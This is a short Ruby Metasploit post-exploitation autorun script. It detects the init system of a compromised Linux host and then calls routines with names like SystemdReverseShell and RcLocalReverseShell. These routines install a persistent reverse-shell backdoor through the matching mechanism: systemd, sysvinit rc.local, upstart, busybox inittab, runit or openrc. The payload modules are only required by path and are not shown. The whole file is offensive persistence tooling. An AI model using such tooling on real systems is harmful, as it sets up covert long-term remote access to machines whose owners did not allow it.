require '/home/msf/msf-autorunscripts/init_detector'
require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
require '/home/msf/msf-autorunscripts/openrc_backdoor_init'
require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
require '/home/msf/msf-autorunscripts/runit_backdoor_sv'

fm        = client.framework
target_ip = client.session_host
sid       = client.sid

print("\n")
#SessionSanitizer.run(fm, target_ip, sid)
print("\n")
#ShellPromotion.run(fm, sid, target_ip, client)
print("\n")
init_type = InitDetector.detect(session)

print("\n")
if init_type == :sysvinit
  RcLocalReverseShell.run(session)
end

if init_type == :systemd
    SystemdReverseShell.run(fm, sid, client)
end

if init_type == :upstart
    UpstartReverseShell.run(fm, sid, client)
end

if init_type == :busybox
    BusyboxInittabReverseShell.run(fm, sid, client)
end

if init_type == :runit
    RunitReverseShell.run(fm, sid, client)
end

if init_type == :openrc
    OpenrcReverseShell.run(fm, sid, client)
end
